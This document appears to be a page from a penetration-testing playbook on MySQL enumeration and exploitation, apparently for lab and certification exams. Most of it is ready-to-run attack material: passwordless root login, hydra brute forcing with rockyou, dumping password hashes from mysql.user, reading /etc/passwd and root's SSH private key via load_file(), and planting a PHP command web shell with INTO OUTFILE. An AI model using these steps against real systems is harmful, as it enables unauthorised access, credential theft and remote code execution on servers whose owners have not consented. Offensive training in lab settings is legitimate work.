---
id: mysql-enum
title: MySQL Enumeration
stage: enumeration
tags: [windows, linux, mysql]
summary: Connect to MySQL, read sensitive files, and write web shells — root with no password is common in lab environments.
leads_to:
  - sqli-rce
  - rev-shell
---

## Prerequisites

Port 3306 open. `root` with no password or a weak password is the most common entry point. File operations require the `FILE` privilege and a writable path.

MySQL running as root with no password is a frequent misconfiguration in exam environments. Even with a low-privilege user, reading files via `load_file()` can expose SSH keys or passwords. Writing to the web root with `INTO OUTFILE` drops a web shell without touching the filesystem directly — check `secure_file_priv` first to confirm file operations aren't blocked.

## Quick Win

> Try root with no password — single most common MySQL misconfiguration.

```bash
mysql -h $TARGET -u root
mysql -h $TARGET -u root -p''
```

## Brute Force (if no anonymous access)

> Try before full wordlist — service accounts often reuse weak passwords.

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/rockyou.txt mysql://$TARGET
nxc mssql $TARGET -u userlist.txt -p passwords.txt   # nxc also supports mysql
```

## Enumerate Once Connected

> Check who you are, what you can do, and whether file operations are available.

```sql
select current_user();
show databases;
use mysql;
select user,host,authentication_string from mysql.user;

-- Critical: check if file operations are allowed
SELECT @@global.secure_file_priv;   -- empty = unrestricted, path = restricted to that dir, NULL = disabled
SHOW GRANTS FOR CURRENT_USER();
```

## Read Files

> Extract sensitive files — SSH keys and passwords are the primary targets.

```sql
select load_file('/etc/passwd');
select load_file('/root/.ssh/id_rsa');
select load_file('/var/www/html/config.php');
```

## Write Web Shell

> Drop a PHP shell into the web root — requires FILE privilege and secure_file_priv allows the path.

```sql
select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/shell.php';
```

## Leads To

Web shell written → rev-shell. SSH key read → ssh-access. Credentials found in databases → password-spray. Write to cron path on Linux MySQL running as root → rev-shell. If running as root OS user, `xp_cmdshell` equivalent doesn't exist in MySQL, but UDF injection can execute OS commands.
